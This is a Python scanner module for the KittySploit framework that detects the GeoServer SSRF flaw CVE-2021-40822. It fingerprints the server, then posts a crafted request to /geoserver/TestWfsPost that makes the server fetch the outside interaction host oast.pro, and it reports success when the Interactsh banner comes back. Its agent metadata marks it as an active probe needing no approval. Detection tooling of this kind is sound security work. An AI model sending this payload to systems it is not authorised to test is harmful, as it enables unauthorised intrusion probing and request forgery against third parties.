#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GeoServer through 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Geoserver - Server-Side Request Forgery Detection',
        'description': 'GeoServer through 2.18.5 and 2.19.x through 2.19.2 allows server-side request forgery via the option for setting a proxy host.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'ssrf', 'geoserver', 'osgeo', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://gccybermonks.com/posts/cve-2021-40822/',
            'https://github.com/geoserver/geoserver/compare/2.19.2...2.19.3',
            'https://github.com/geoserver/geoserver/releases',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-40822',
            'https://osgeo-org.atlassian.net/browse/GEOS-10229',
        ],
        'cve': 'CVE-2021-40822',
    }

    def run(self):
        path = '/geoserver/'
        r = self.http_request(method='GET', path=path, allow_redirects=True)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_any = ('geoserver.web', 'geoserverbasepage', 'geoserver: redirecting',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/geoserver/TestWfsPost'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='form_hf_0=&url=http://oast.pro/geoserver/../&body=&username=&password=\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<b>Interactsh</b>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='Geoserver - Server-Side Request Forgery detected', path=path)
            return True
        return False

